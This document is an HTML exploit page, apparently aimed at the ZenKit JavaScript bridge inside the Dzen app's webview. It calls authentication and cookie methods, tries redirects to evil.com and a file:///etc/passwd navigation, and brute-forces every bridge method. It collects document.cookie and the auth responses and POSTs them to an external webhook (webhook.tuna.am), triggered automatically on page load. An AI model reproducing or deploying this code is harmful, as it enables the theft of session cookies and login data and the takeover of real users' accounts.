<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZenKit Method Exploit</title>
    <style>
        body {
            font-family: monospace;
            padding: 15px;
            background: #0d1117;
            color: #c9d1d9;
            font-size: 13px;
        }
        h1 { color: #f85149; font-size: 16px; }
        h2 { color: #58a6ff; font-size: 14px; margin-top: 20px; }
        #results {
            background: #161b22;
            padding: 15px;
            border-radius: 8px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 250px;
            overflow-y: auto;
            margin: 10px 0;
            border: 1px solid #30363d;
        }
        .found { color: #3fb950; }
        .warn { color: #d29922; }
        .error { color: #f85149; }
        .critical { color: #f85149; font-weight: bold; }
        button {
            padding: 8px 12px;
            margin: 3px;
            background: #238636;
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 11px;
        }
        .btn-critical { background: #da3633; }
        .section {
            margin: 15px 0;
            padding: 12px;
            background: #161b22;
            border-radius: 8px;
            border: 1px solid #30363d;
        }
    </style>
</head>
<body>
    <h1>üîì ZenKit Critical Exploit</h1>
    
    <div class="section">
        <h2>üîë AUTH & COOKIES (CRITICAL)</h2>
        <button class="btn-critical" onclick="tryRequestCookieAuthURL()">requestCookieAuthURL()</button>
        <button class="btn-critical" onclick="tryLogin()">login()</button>
        <button class="btn-critical" onclick="tryRefreshConfig()">refreshConfig()</button>
    </div>
    
    <div class="section">
        <h2>üì± NATIVE ACTIONS</h2>
        <button onclick="tryNavigate()">navigate()</button>
        <button onclick="tryOpenSettings()">openSettings()</button>
        <button onclick="tryOpenBell()">openBell()</button>
        <button onclick="tryCapturePhoto()">captureDocumentPhoto()</button>
        <button onclick="tryShare()">share()</button>
    </div>
    
    <div class="section">
        <h2>üìù DATA MANIPULATION</h2>
        <button onclick="tryUpdateStorage()">updateStorage()</button>
        <button onclick="tryArticleUpdate()">articleUpdate()</button>
        <button onclick="tryInterestSubscribe()">interestSubscribe()</button>
        <button onclick="tryShowCreatePublication()">showCreatePublicationScreen()</button>
    </div>
    
    <div class="section">
        <h2>üîç INFO GATHERING</h2>
        <button onclick="tryOnReady()">onReady()</button>
        <button onclick="tryArticleInit()">articleInit()</button>
        <button onclick="listenEvents()">Listen All Events</button>
        <button onclick="bruteforceCall()">Bruteforce Params</button>
    </div>
    
    <div id="results">–†–µ–∑—É–ª—å—Ç–∞—Ç—ã...</div>
    
    <div class="section">
        <button class="btn-critical" onclick="sendResults()">üì§ SEND ALL TO WEBHOOK</button>
    </div>

    <script>
        var results = document.getElementById('results');
        var collectedData = { methods: {}, responses: {} };
        
        function log(msg, type) {
            results.innerHTML += '<span class="' + (type || '') + '">' + msg + '</span>\n';
            results.scrollTop = results.scrollHeight;
            console.log(msg);
        }
        
        function clear() { results.innerHTML = ''; }
        
        // ========== CRITICAL: AUTH METHODS ==========
        
        function tryRequestCookieAuthURL() {
            clear();
            log('=== requestCookieAuthURL() ===\n', 'critical');
            
            // –ü—Ä–æ–±—É–µ–º —Ä–∞–∑–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã –≤—ã–∑–æ–≤–∞
            var variants = [
                function() { return ZENKIT.requestCookieAuthURL(); },
                function() { return ZENKIT.requestCookieAuthURL({}); },
                function() { return ZENKIT.requestCookieAuthURL('https://dzen.ru'); },
                function() { return ZENKIT.requestCookieAuthURL({url: 'https://dzen.ru'}); },
                function() { return NATIVE_ZENKIT.requestCookieAuthURL(); },
                function() { return NATIVE_ZENKIT.requestCookieAuthURL(''); }
            ];
            
            variants.forEach(function(fn, i) {
                try {
                    log('Variant ' + i + ':', 'warn');
                    var result = fn();
                    log('Result: ' + JSON.stringify(result), 'found');
                    collectedData.responses.cookieAuthURL = result;
                    
                    // –ï—Å–ª–∏ —ç—Ç–æ Promise
                    if (result && typeof result.then === 'function') {
                        result.then(function(data) {
                            log('üîë PROMISE RESOLVED: ' + JSON.stringify(data), 'critical');
                            collectedData.responses.cookieAuthURL_resolved = data;
                            sendResults();
                        }).catch(function(err) {
                            log('Promise rejected: ' + err, 'error');
                        });
                    }
                } catch(e) {
                    log('Error: ' + e.message, 'error');
                }
            });
        }
        
        function tryLogin() {
            clear();
            log('=== login() ===\n', 'critical');
            
            var variants = [
                function() { return ZENKIT.login(); },
                function() { return ZENKIT.login({}); },
                function() { return ZENKIT.login({redirect: 'https://evil.com'}); },
                function() { return NATIVE_ZENKIT.login(); }
            ];
            
            variants.forEach(function(fn, i) {
                try {
                    log('Variant ' + i + ':', 'warn');
                    var result = fn();
                    log('Result: ' + JSON.stringify(result), 'found');
                    
                    if (result && typeof result.then === 'function') {
                        result.then(function(data) {
                            log('üîë LOGIN DATA: ' + JSON.stringify(data), 'critical');
                            collectedData.responses.login = data;
                            sendResults();
                        }).catch(function(err) {
                            log('Promise rejected: ' + err, 'error');
                        });
                    }
                } catch(e) {
                    log('Error: ' + e.message, 'error');
                }
            });
        }
        
        function tryRefreshConfig() {
            clear();
            log('=== refreshConfig() ===\n', 'warn');
            
            try {
                var result = ZENKIT.refreshConfig();
                log('Result: ' + JSON.stringify(result), 'found');
                
                if (result && typeof result.then === 'function') {
                    result.then(function(data) {
                        log('CONFIG DATA: ' + JSON.stringify(data, null, 2), 'critical');
                        collectedData.responses.config = data;
                    }).catch(function(err) {
                        log('Error: ' + err, 'error');
                    });
                }
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        // ========== NATIVE ACTIONS ==========
        
        function tryNavigate() {
            clear();
            log('=== navigate() ===\n', 'warn');
            
            var urls = [
                'https://evil.com',
                'dzen://settings',
                'dzen://profile',
                '/settings',
                '/profile',
                'file:///etc/passwd'
            ];
            
            urls.forEach(function(url) {
                try {
                    log('Trying: ' + url, '');
                    var result = ZENKIT.navigate(url);
                    log('Result: ' + JSON.stringify(result), 'found');
                } catch(e) {
                    log('Error: ' + e.message, 'error');
                }
            });
            
            // –° –æ–±—ä–µ–∫—Ç–æ–º
            try {
                log('\nWith object:', '');
                var result = ZENKIT.navigate({url: 'https://evil.com', external: true});
                log('Result: ' + JSON.stringify(result), 'found');
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function tryOpenSettings() {
            clear();
            log('=== openSettings() ===\n', 'warn');
            try {
                var result = ZENKIT.openSettings();
                log('Result: ' + JSON.stringify(result), 'found');
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function tryOpenBell() {
            clear();
            log('=== openBell() ===\n', 'warn');
            try {
                var result = ZENKIT.openBell();
                log('Result: ' + JSON.stringify(result), 'found');
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function tryCapturePhoto() {
            clear();
            log('=== captureDocumentPhoto() ===\n', 'warn');
            try {
                var result = ZENKIT.captureDocumentPhoto();
                log('Result: ' + JSON.stringify(result), 'found');
                
                if (result && typeof result.then === 'function') {
                    result.then(function(data) {
                        log('üì∏ PHOTO DATA: ' + JSON.stringify(data), 'critical');
                        collectedData.responses.photo = data;
                    }).catch(function(err) {
                        log('Error: ' + err, 'error');
                    });
                }
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function tryShare() {
            clear();
            log('=== share() ===\n', 'warn');
            
            var variants = [
                {text: 'Hacked by attacker', url: 'https://evil.com'},
                {title: 'Check this', text: 'Malicious link', url: 'https://evil.com'},
                'https://evil.com'
            ];
            
            variants.forEach(function(params, i) {
                try {
                    log('Variant ' + i + ': ' + JSON.stringify(params), '');
                    var result = ZENKIT.share(params);
                    log('Result: ' + JSON.stringify(result), 'found');
                } catch(e) {
                    log('Error: ' + e.message, 'error');
                }
            });
        }
        
        // ========== DATA MANIPULATION ==========
        
        function tryUpdateStorage() {
            clear();
            log('=== updateStorage() ===\n', 'warn');
            
            try {
                // –ü—Ä–æ–±—É–µ–º –∑–∞–ø–∏—Å–∞—Ç—å –¥–∞–Ω–Ω—ã–µ
                var result = ZENKIT.updateStorage({key: 'evil', value: 'hacked'});
                log('Write result: ' + JSON.stringify(result), 'found');
                
                // –ü—Ä–æ–±—É–µ–º –ø—Ä–æ—á–∏—Ç–∞—Ç—å
                var result2 = ZENKIT.updateStorage({action: 'get'});
                log('Read result: ' + JSON.stringify(result2), 'found');
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function tryArticleUpdate() {
            clear();
            log('=== articleUpdate() ===\n', 'warn');
            try {
                var result = ZENKIT.articleUpdate({id: '123', liked: true});
                log('Result: ' + JSON.stringify(result), 'found');
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function tryInterestSubscribe() {
            clear();
            log('=== interestSubscribe() ===\n', 'warn');
            try {
                var result = ZENKIT.interestSubscribe({interest: 'hacking'});
                log('Result: ' + JSON.stringify(result), 'found');
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function tryShowCreatePublication() {
            clear();
            log('=== showCreatePublicationScreen() ===\n', 'warn');
            try {
                var result = ZENKIT.showCreatePublicationScreen();
                log('Result: ' + JSON.stringify(result), 'found');
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        // ========== INFO GATHERING ==========
        
        function tryOnReady() {
            clear();
            log('=== onReady() ===\n', 'warn');
            try {
                var result = ZENKIT.onReady();
                log('Result: ' + JSON.stringify(result), 'found');
                
                if (result && typeof result.then === 'function') {
                    result.then(function(data) {
                        log('READY DATA: ' + JSON.stringify(data, null, 2), 'critical');
                        collectedData.responses.ready = data;
                    });
                }
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function tryArticleInit() {
            clear();
            log('=== articleInit() ===\n', 'warn');
            try {
                var result = ZENKIT.articleInit();
                log('Result: ' + JSON.stringify(result), 'found');
                
                if (result && typeof result.then === 'function') {
                    result.then(function(data) {
                        log('INIT DATA: ' + JSON.stringify(data, null, 2), 'critical');
                        collectedData.responses.init = data;
                    });
                }
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function listenEvents() {
            clear();
            log('=== Listening to ALL events ===\n', 'warn');
            
            var events = [
                'ready', 'config', 'user', 'auth', 'login', 'logout',
                'navigation', 'error', 'data', 'storage', 'message'
            ];
            
            events.forEach(function(event) {
                try {
                    ZENKIT.on(event, function(data) {
                        log('EVENT [' + event + ']: ' + JSON.stringify(data), 'critical');
                        collectedData.responses['event_' + event] = data;
                    });
                    log('Subscribed to: ' + event, 'found');
                } catch(e) {}
            });
            
            log('\nWaiting for events...', 'warn');
        }
        
        function bruteforceCall() {
            clear();
            log('=== Bruteforce method calls ===\n', 'warn');
            
            var methods = Object.keys(ZENKIT);
            
            methods.forEach(function(method) {
                if (typeof ZENKIT[method] === 'function' && method !== 'on' && method !== 'off') {
                    try {
                        log('Calling ' + method + '()...', '');
                        var result = ZENKIT[method]();
                        
                        if (result && typeof result.then === 'function') {
                            result.then(function(data) {
                                if (data) {
                                    log('‚úì ' + method + ' returned: ' + JSON.stringify(data).substring(0, 200), 'found');
                                    collectedData.methods[method] = data;
                                }
                            }).catch(function(){});
                        } else if (result) {
                            log('‚úì ' + method + ' = ' + JSON.stringify(result).substring(0, 100), 'found');
                        }
                    } catch(e) {}
                }
            });
        }
        
        // ========== SEND RESULTS ==========
        
        function sendResults() {
            collectedData.timestamp = new Date().toISOString();
            collectedData.userAgent = navigator.userAgent;
            collectedData.url = window.location.href;
            collectedData.cookies = document.cookie;
            
            log('\nüì§ Sending to webhook...', 'warn');
            
            fetch('https://webhook.tuna.am/387WocKA8chxCpAjoA4S1rxg7cV', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(collectedData)
            })
            .then(function() { log('‚úì Sent!', 'found'); })
            .catch(function(e) { log('Error: ' + e, 'error'); });
        }
        
        // Auto-run critical methods
        window.onload = function() {
            log('Auto-running critical methods...\n', 'warn');
            listenEvents();
            
            setTimeout(function() {
                tryRequestCookieAuthURL();
            }, 1000);
        };
    </script>
</body>
</html>
